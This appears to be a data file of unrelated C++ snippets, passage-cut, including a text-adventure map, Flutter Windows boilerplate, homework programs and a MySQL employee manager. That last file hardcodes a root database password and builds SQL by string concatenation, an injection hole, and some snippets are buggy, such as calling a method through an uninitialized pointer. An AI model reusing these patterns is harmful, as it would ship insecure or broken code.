rooms[SOUTH_MAIN_ROAD] = Room(\"The main road of the village\");\n    rooms[SOUTH_MAIN_ROAD].exits[NORTH] = NORTH_MAIN_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[EAST] = TAVERN;\n    rooms[SOUTH_MAIN_ROAD].exits[SOUTH] = SIDE_ROAD;\n    rooms[SOUTH_MAIN_ROAD].exits[WEST] = ADVENTURERS_GUILD;\n\n    rooms[TAVERN] = Room(\"Loud tavern with a bar, and rooms for rent.\");\n    rooms[TAVERN].exits[NORTH] = SHOPPING_CENTER;\n    rooms[TAVERN].exits[EAST] = NONE;\n    rooms[TAVERN].exits[SOUTH] = NONE;\n    rooms[TAVERN].exits[WEST] = SOUTH_MAIN_ROAD;\n\n    rooms[ANCIENT_TREESTUMP] = Room(\"This old stump once was the home of the fae.\");\n    rooms[ANCIENT_TREESTUMP].exits[NORTH] = NONE;\n    rooms[ANCIENT_TREESTUMP].exits[EAST] = NORTH_MAIN_ROAD;\n    rooms[ANCIENT_TREESTUMP].exits[SOUTH] = ADVENTURERS_GUILD;\n    rooms[ANCIENT_TREESTUMP].exits[WEST] = NONE;\n\n    rooms[ADVENTURERS_GUILD] = Room(\"A place for adventurers to gather, drink, and rest.\");\n    rooms[ADVENTURERS_GUILD].exits[NORTH] = ANCIENT_TREESTUMP;\n    rooms[ADVENTURERS_GUILD].exits[EAST] = SOUTH_MAIN_ROAD;\n    rooms[ADVENTURERS_GUILD].exits[SOUTH] = NONE;\n    rooms[ADVENTURERS_GUILD].exits[WEST] = NONE;\n\n    rooms[FORGE] = Room(\"A Dwarven forge with a few beautifully crafted swords on display.\");\n    rooms[FORGE].exits[NORTH] = NONE;\n    rooms[FORGE].exits[EAST] = NONE;\n    rooms[FORGE].exits[SOUTH] = NONE;\n    rooms[FORGE].exits[WEST] = SHOPPING_CENTER;\n\n    rooms[GLOWING_POND] = Room(\"Theres a pond here that emits a mysterious glow. It's in the center of new village.\");\n    rooms[GLOWING_POND].exits[NORTH] = BRIDGE;\n    rooms[GLOWING_POND].exits[EAST] = WINE_CELLAR;\n    rooms[GLOWING_POND].exits[SOUTH] = NORTH_MAIN_ROAD;\n    rooms[GLOWING_POND].exits[WEST] = VILLAGERS_HOUSES;\n\n    rooms[WINE_CELLAR] = Room(\"A hidden wine cellar by the pond. Is it still in use?\");\n    rooms[WINE_CELLAR].exits[NORTH] = NONE;\n    rooms[WINE_CELLAR].exits[EAST] = NONE;\n    rooms[WINE_CELLAR].exits[SOUTH] = NONE;\n    rooms[WINE_CELLAR].exits[WEST] = NONE;\n\n    rooms[STABLES] = Room(\"Many horses are kept here. The smell of hay and manure is strong.\");\n    rooms[STABLES].exits[NORTH] = PASTURE;\n    rooms[STABLES].exits[EAST] = VILLAGERS_HOUSES;\n    rooms[STABLES].exits[SOUTH] = NONE;\n    rooms[STABLES].exits[WEST] = NONE;\n\n    rooms[PATH_OUT_OF_TOWN] = Room(\"A path leading out of town. It looks a bit rough.\");\n    rooms[PATH_OUT_OF_TOWN].exits[NORTH] = NONE;\n    rooms[PATH_OUT_OF_TOWN].exits[EAST] = FORGOTTEN_PATH;\n    rooms[PATH_OUT_OF_TOWN].exits[SOUTH] = BRIDGE;\n    rooms[PATH_OUT_OF_TOWN].exits[WEST] = NONE;\n\n    rooms[BRIDGE] = Room(\"A stone bridge that leads to the path out of town. It looks newly built.\");\n    rooms[BRIDGE].exits[NORTH] = PATH_OUT_OF_TOWN;\n    rooms[BRIDGE].exits[EAST] = NONE;\n    rooms[BRIDGE].exits[SOUTH] = GLOWING_POND;\n    rooms[BRIDGE].exits[WEST] = NONE;\n\n    rooms[PASTURE] = Room(\"A pasture for adventurers horses to graze.\");\n    rooms[PASTURE].exits[NORTH] = NONE;\n    rooms[PASTURE].exits[EAST] = NONE;\n    rooms[PASTURE].exits[SOUTH] = STABLES;\n    rooms[PASTURE].exits[WEST] = NONE;\n\n    rooms[SIDE_ROAD] = Room(\"A small side road that leads to the important places in town.\");\n    roo",
    "#include \"quad_tree.h\"\n#include <iostream>\n\n\nstruct Item {\n    float x;\n    float y;\n    float width;\n    float height;\n\n\n    Item(float x_in, float y_in, float width_in, float height_in) {\n        x = x_in;\n        y = y_in;\n        width = width_in;\n        height = height_in;\n    }\n    Item(){ x= 1; y = 1; width = 1; height = 1;}\n    float getX(){\n        return x;\n    }\n\n    float getY(){\n        return y;\n    }\n\n    float getWidth(){\n        return width;\n    }\n\n    float getHeight(){\n        return height;\n    }\n};\n\n\n\nint main() {\n\n    Item new_item1(3,3,2,2);\n    Item new_item2(2,3,2,3);\n    Item new_item3(3,1,3,3);\n\n    QuadTreeContainer<Item> new_tree(Point(0,0), Point(16,16));\n\n    new_tree.insert(new_item1);\n    new_tree.insert(new_item2);\n    new_tree.insert(new_item3);\n\n    //new_tree.pop_front();\n\n    std::list<QTI<Item> >::iterator first_item = new_tree.begin();\n\n    //new_tree.remove(last_item);\n\n    std::list<Item*> item_list;\n\n    item_list = new_tree.search(first_item);\n    for(auto it = item_list.begin(); it != item_list.end(); it++)\n    {\n        std::cout << \"x: \" << (*it)->x << \" y: \" << (*it)->y << std::endl;\n    }\n\n    /*first_item->item.x = 4;\n    first_item->item.y = 4;;\n    new_tree.reinsert(first_item);\n\n    item_list.clear();\n    item_list = new_tree.search(first_item->item);\n\n    for(auto it = item_list.begin(); it != item_list.end(); it++)\n    {\n        std::cout << \"x: \" << (*it)->x << \" y: \" << (*it)->y << std::endl;\n    }*/\n    \n\n    //item_list = new_tree.search(new_item3);\n\n    //std::cout<< \"item_list size= \" << item_list.size() << std::endl;\n\n    return 0;\n}\n\n\n",
    "/*Create a base class called shape. Use this class to store two double type values '\r\n that could be used to compute the area of figures. Derive two specific classes called\r\n  triangle and rectangle from the base shape. Add to the base class, a member function get data() to\r\ninitialize base class data members and another member. function display_area() to compute and display the area of figures.\r\nMake display_areal) as a virtual function and redefine this function in the derived classes to suit their requirements.\r\nUsing these three classes, design a program that will accept dimensions ofa triangle .\r\n or a rectangle interactively, and display the area.\r\nRemember the two values given as input will be treated as lengths of two sides in the case of rectangles,\r\n and as base and height in the case of triangles, and used follows\r\nArea of rectangle=x*y\r\nArea of triangles =1/2 *x*y*/\r\n#include<iostream>\r\nusing namespace std;\r\nclass shape\r\n{\r\n\tpublic:\r\n\tdouble side1;\r\n\tdouble side2;\r\n\tvoid get_data()\r\n\t{\r\n\t\tcout<<\"\\nEnter side 1 and side 2\";\r\n\t\tcin>>side1>>side2;\r\n\t}\r\n\tvoid display_data()\r\n\t{\r\n\t\tcout<<\"\\nSides are\"<<side1<<\"and\"<<side2;\r\n\t}\r\n\tvirtual void display_area()\r\n\t{\r\n\t\tcout<<\"\\nShape class\";\r\n\t}\r\n};\r\nclass triangle:public shape\r\n{\r\n\tvoid display_area()\r\n\t{\r\n\t\t\tcout<<\"\\nArea of triangle is\"<<0.5*side1*side2;\r\n\t}\r\n};\r\nclass rectangle:public shape\r\n{\r\n\tvoid display_area()\r\n\t{\r\n\t\tcout<<\"\\nArea of rectangle is\"<<side1*side2;\r\n\t}\r\n};\r\nmain()\r\n{\r\n\tshape *s;\r\n\ttriangle t;\r\n\trectangle r;\r\n\r\n\ts->get_data();\r\n\ts->display_data();\r\n\ts=&t;\r\n\ts->display_area();\r\n\ts=&r;\r\n\ts->display_area();\r\n}\r\n",
    "//\n//  main.cpp\n//  KnapsackProblem\n//\n//  Created by Woo Sung Jahng on 2024/04/24.\n//\n\n#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\n// Class for single element in set V\nclass Object {\nprivate:\n    int num; // Object No.\n    int size; // Size of object\n    int price; // Price of object\npublic:\n    Object(int num, int size, int price) {\n        this->num = num;\n        this->size = size;\n        this->price = price;\n    }\n    // Read object no.\n    int objnum() {\n        return num;\n    }\n    // Read the size of object\n    int objsize() {\n        return size;\n    }\n    // Read the price of object\n    int objprice() {\n        return price;\n    }\n};\n\n// Function for comparing price per size of two objects\nbool PricePerSize(Object& a, Object& b) {\n    return a.objprice()/a.objsize() > b.objprice()/b.objsize();\n}\n\nint main(int argc, const char * argv[]) {\n    int n, b, i, j;\n    \n    // Input n(size of set V)\n    n = 4;\n    \n    // Input b(size of knapsack)\n    b = 13;\n    \n    vector<int> sizes(n);\n    vector<int> prices(n);\n    \n    // Input size and price of objects\n    sizes = {2, 3, 5, 7};\n    prices = {500, 1000, 800, 900};\n    \n    vector<Object> obj;\n    for (i=0; i<n; i++) {\n        obj.emplace_back(i, sizes[i], prices[i]);\n    }\n    \n    // Sort objects by price per size by higher to lower\n    sort(obj.begin(), obj.end(), PricePerSize);\n    \n    \n//    // Check sorted vector obj\n//    cout << \"Order of sorted obj : \";\n//    for (auto& object : obj) cout << object.objnum() << \" \";\n//    cout << endl;\n    \n    int currentSize = 0;\n    int totalPrice = 0;\n    int maxPrice = 0;\n    \n    for (j=0; j<n; j++) {\n        for (i=j; i<n; i++) {\n            if (currentSize + obj[i].objsize() <= b) {\n                currentSize += obj[i].objsize();\n                totalPrice += obj[i].objprice();\n//                // Track calculation\n//                cout << '+' << obj[i].objprice() << endl;\n            }\n        }\n        if (totalPrice >= maxPrice) maxPrice = totalPrice;\n    }\n\n    // Print the maximum price value\n    cout << maxPrice << endl;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"practice_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <math.h>\nusing namespace std;\n\nfloat formula(float x_0, float x_1, float x_2, float a_0, float a_1, float a_2, int n) {\n    if (n == 2) return a_2;\n    if (n == 1) return a_1;\n    if (n == 0) return a_0;\n    \n    float result;\n    float det = (x_1*x_2*x_2 - x_2*x_1*x_1) - (x_0*x_2*x_2 - x_2*x_0*x_0) + (x_0*x_1*x_1 - x_1*x_0*x_0);\n    float l_0 = (a_0*(x_1*x_2*x_2 - x_2*x_1*x_1) - a_1*(x_2*x_2 - x_1*x_1) + a_2*(x_2 - x_1)) / det;\n    float l_1 = (-a_0*(x_0*x_2*x_2 - x_2*x_0*x_0) + a_1*(x_2*x_2 - x_0*x_0) - a_2*(x_2 - x_0)) / det;\n    float l_2 = (a_0*(x_0*x_1*x_1 - x_1*x_0*x_0) - a_1*(x_1*x_1 - x_0*x_0) + a_2*(x_1 - x_0)) / det;\n\n    result = l_0 * pow(x_0, n) + l_1 * pow(x_1, n) + l_2 * pow(x_2, n);\n\n    return result;\n}\n\nfloat rekurzija(float x_0, float x_1, float x_2, float a_0, float a_1, float a_2, int n) {\n    if (n == 2) return a_2;\n    if (n == 1) return a_1;\n    if (n == 0) return a_0;\n\n    float c_1 = x_0 + x_1 + x_2;\n    float c_2 = -(x_0 * x_1) - (x_0 * x_2) - (x_1 * x_2);\n    float c_3 = x_0 * x_1 * x_2;\n\n    float result;\n    result = c_1 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 1)\n             + c_2 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 2)\n             + c_3 * rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n - 3);\n\n    return result;\n}\n\nint main(void) {\n    float x_0, x_1, x_2;\n    float a_0, a_1, a_2;\n    int n;\n    \n    cout << \"Unesite prvo rjesenje x_0 karakteristicne jednadzbe: \";\n    cin >> x_0;\n    cout << \"Unesite drugo rjesenje x_1 karakteristicne jednadzbe: \";\n    cin >> x_1;\n    cout << \"Unesite trece rjesenje x_2 karakteristicne jednadzbe: \";\n    cin >> x_2;\n    cout << \"Unesite vrijednost nultog clana niza a_0: \";\n    cin >> a_0;\n    cout << \"Unesite vrijednost prvog clana niza a_1: \";\n    cin >> a_1;\n    cout << \"Unesite vrijednost drugog clana niza a_2: \";\n    cin >> a_2;\n    cout << \"Unesite redni broj n trazenog clana niza: \";\n    cin >> n;\n\n    cout << \"Vrijednost n-tog clana niza pomocu formule: \" << formula(x_0, x_1, x_2, a_0, a_1, a_2, n) << endl;\n    cout << \"Vrijednost n-tog clana niza iz rekurzije: \" << rekurzija(x_0, x_1, x_2, a_0, a_1, a_2, n) << endl;\n\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"elevationbutton\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<cstdlib>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int a,b,c=0,d=0,f=0;\r\n    cout<<\"*********************Welcome to guess number game .***************************\\nRules:\\n\"<<endl;\r\n    cout<<\"1.Enter y for yes and n for exit the game\"<<endl;\r\n    cout<<\"2.You have to enter number in between 1-10\"<<endl;\r\n    char e;\r\n    do\r\n    {\r\n    \t\r\n        cout<<\"Enter the guess number from 1-10 you think         \";\r\n        cin>>a;\r\n        cout<<endl;\r\n        b=rand()%10+1;\r\n  \r\n        if(b==a)\r\n        {\r\n            cout<<\"Congratulations you guess correct number     \"<<endl;\r\n            c++;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Sorry,wrong guessded number Try again    \"<<endl;\r\n            d++;\r\n        }\r\n        f++;\r\n        cout<<\"Do you want to try again y/n     \";\r\n        cin>>e;\r\n        cout<<endl;\r\n        if(e=='n'||e=='y'){}\r\n        else\r\n        {\r\n            cout<<\"Invalid input.Plz enter again to play game or to exit    \"<<endl;\r\n        }\r\n    }while(e!='n');\r\n    cout<<\"You tried \"<<f<<\"times\"<<endl;\r\n    cout<<\"You guessed correct number \"<<c<<\" times\"<<endl;\r\n    cout<<\"You guessed wrong number  \"<<d<<\" times\"<<endl;\r\n}\r\n",
    "#include <mysql_driver.h>\n#include <mysql_connection.h>\n#include <cppconn/statement.h>\n#include <iostream>\n#include <string>\n#include <algorithm>\n\n#define max 20\nusing namespace std;\n\n// Structure of Employee\nstruct Employee {\n    string name;\n    long int code;\n    string designation;\n    int exp;\n    int age;\n};\n\nclass EmployeeManagementSystem {\nprivate:\n    Employee emp[max];\n    int num;\n\n    // MySQL Connector variables\n    sql::mysql::MySQL_Driver* driver;\n    sql::Connection* con;\n\n    // Function to initialize MySQL Connector\n    void initMySQL() {\n        try {\n            driver = sql::mysql::get_mysql_driver_instance();\n            con = driver->connect(\"tcp://localhost:3306\", \"root\", \"PHW#84#jeor\");\n            con->setSchema(\"quickstartdb\");\n        }\n        catch (sql::SQLException& e) {\n            cout << \"MySQL Connection Error: \" << e.what() << endl;\n            // Handle the error, perhaps exit the program or return an error code.\n        }\n    }\n\n\n    // Function to close MySQL Connection\n    void closeMySQL() {\n        delete con;\n    }\n\n    // Function to insert an employee into MySQL\n    void insertIntoMySQL(int index) {\n        sql::Statement* stmt = con->createStatement();\n        stmt->execute(\"INSERT INTO EmployeeTable (Name, EmployeeID, Designation, Experience, Age) VALUES ('\" + emp[index].name + \"', \" + to_string(emp[index].code) + \", '\" + emp[index].designation + \"', \" + to_string(emp[index].exp) + \", \" + to_string(emp[index].age) + \")\");\n        delete stmt;\n    }\n\n    // Function to calculate the average experience of all employees\n    void calculateAverageExperience() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT AVG(Experience) AS 